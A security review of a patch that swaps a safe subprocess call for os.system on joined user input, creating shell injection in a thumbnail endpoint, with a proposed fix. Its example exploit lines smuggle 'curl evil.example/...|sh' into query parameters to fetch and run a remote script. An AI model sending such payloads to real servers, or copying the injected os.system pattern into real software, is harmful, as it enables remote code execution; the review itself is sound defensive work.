## Security Review: `diff-obfuscated-cmdi.patch`

**Critical: OS Command Injection (CWE-78)** — `src/media/thumbnail.py:10`

The diff swaps a safe call:
```python
subprocess.run(["convert", infile, "-resize", size, outfile], check=True)
```
for:
```python
parts = ["convert", infile, "-resize", size, outfile]
os.system(" ".join(parts))
```

`infile` and `size` come straight from `request.GET` with no validation or escaping. The original `subprocess.run([...])` call (no `shell=True`) passes each element directly to `execve`, so shell metacharacters inside `infile`/`size` are inert — safe. The new code concatenates everything into one string and hands it to `os.system`, which runs it via `sh -c`. Any shell metacharacter in the user input now executes as a command.

Example exploit:
```
GET /thumbnail?src=input.png;curl+http://evil.example/x.sh|sh;&size=100x100
```
or using command substitution:
```
GET /thumbnail?size=100x100$(curl -s evil.example/p.sh|sh)
```
This yields full remote command execution with the privileges of the web process — not just argument confusion, but arbitrary shell command execution.

**Medium: Misleading/dead fix** — `src/media/thumbnail.py:3`

`import shlex` is added but never used. This strongly suggests the intent was to build the command safely (e.g. `shlex.quote()` on each part, or `shlex.join(parts)` and still avoid `os.system`/`shell=True`), but the actual quoting call was never applied. This makes the diff look safer on a quick skim than it is — a reviewer may see `shlex` imported next to `os.system` and assume escaping is happening, when `" ".join(parts)` performs no escaping at all.

**Fix:** revert to the list-form `subprocess.run(["convert", infile, "-resize", size, outfile], check=True)` (no shell involved), and additionally validate `size` against an expected pattern (e.g. `^\d+x\d+$`) and constrain/validate `infile` (e.g. restrict to a safe directory / whitelist extension) to guard against ImageMagick-specific issues (e.g. coercion via crafted filenames/URLs like `https://...` or `|command` delegates — the historical "ImageTragick" class of bugs) independent of the shell-injection fix.
